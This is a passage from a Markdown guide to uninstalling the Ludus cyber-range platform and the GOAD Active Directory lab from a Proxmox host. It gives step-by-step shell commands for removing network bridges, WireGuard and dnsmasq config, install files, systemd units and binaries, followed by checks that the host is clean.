  ip link set $br down 2>/dev/null
  ip link delete $br 2>/dev/null
done

# Strip Ludus bridges from /etc/network/interfaces
cp /etc/network/interfaces /etc/network/interfaces.bak

python3 <<'PY'
import re
with open('/etc/network/interfaces') as f:
    content = f.read()
content = re.sub(
    r'(?m)^auto vmbr10\d+\n(?:^iface vmbr10\d+.*\n(?:^\s+.*\n)*)?',
    '', content)
content = re.sub(r'\n{3,}', '\n\n', content)
with open('/etc/network/interfaces', 'w') as f:
    f.write(content)
PY

systemctl restart networking 2>/dev/null || ifreload -a
```

> If you lose Proxmox connectivity: `cp /etc/network/interfaces.bak /etc/network/interfaces && systemctl restart networking`

### Step 7 — Remove WireGuard and dnsmasq config

```bash
ip link delete wg0 2>/dev/null
ip link delete ludus 2>/dev/null

rm -f /etc/wireguard/wg0.conf /etc/wireguard/ludus.conf
systemctl disable wg-quick@wg0 2>/dev/null
systemctl disable wg-quick@ludus 2>/dev/null

rm -f /etc/dnsmasq.d/dnsmasq-vmbr1000.conf
rm -f /etc/dnsmasq.d/01-ludus.conf
systemctl restart dnsmasq 2>/dev/null
```

### Step 8 — Delete Ludus install dir

```bash
du -sh /opt/ludus 2>/dev/null
rm -rf /opt/ludus
rm -rf /opt/ludus-src
```

### Step 9 — Remove systemd units

```bash
rm -f /etc/systemd/system/ludus.service
rm -f /etc/systemd/system/ludus-admin.service
systemctl daemon-reload
```

### Step 10 — Remove Ludus binaries

```bash
rm -f /usr/local/bin/ludus
rm -f /usr/local/bin/ludus-install-status
rm -f /usr/local/bin/ludus-server
```

### Step 11 — Clean GOAD

```bash
rm -rf /root/GOAD
rm -rf /root/.goad
rm -rf /root/.ansible
```

### Step 12 — Reclaim space

```bash
apt autoremove --purge -y
apt clean
journalctl --vacuum-size=200M
rm -rf /tmp/ludus* /tmp/goad* /tmp/.ansible* 2>/dev/null
fstrim -av                     # SSD trim — helps thin pool reclaim
```

### Step 13 — Verify

```bash
qm list                                           # only your VMs
pvesh get /pools                                  # no ADMIN/SHARED/GOAD pools
pveum group list                                  # no ludus_*
pveum user token list root@pam                    # no ludus-token
ls /opt/ludus 2>&1                                # not exist
which ludus                                       # not found
ip link show | grep -E 'vmbr10|wg0' && echo "STILL PRESENT" || echo "CLEAN"
df -h /
pvesm status
```

### Step 14 — Reboot (recommended)

```bash
reboot
```

After reboot, run `qm list` and `df -h /` again to confirm clean state.

### Step 15 — Mac side

1. WireGuard.app → select Ludus tunnel → click `−` → confirm
2. `rm ~/Downloads/ludus.conf 2>/dev/null`

### Selective removal options

**Remove only GOAD, keep Ludus**:
```bash
ludus user rm --userid GOADLightbbe829 --url https://127.0.0.1:8081
rm -rf /root/GOAD /root/.goad
```

**Reset just a range, keep config**:
```bash
ludus --user $GOAD_USER range rm
ludus --user $GOAD_USER range deploy
```

### Space reclaimed

Typical recovery on a populated host: **80–250 GB**, primarily from:
- Template VMs (~30–60 GB each thin-provisioned)
- Range VMs (~20–40 GB each)
- Ludus install + PocketBase (~1–3 GB)
- GOAD source + ansible cache (~500 MB)

---

## References

- GOAD: <https://github.com/Orange-Cyberdefense/GOAD>
- GOAD walkthroughs: <https://orange-cyberdefense.github.io/GOAD/labs/GOAD-Light/>
- Ludus docs: <https://docs.ludus.cloud>
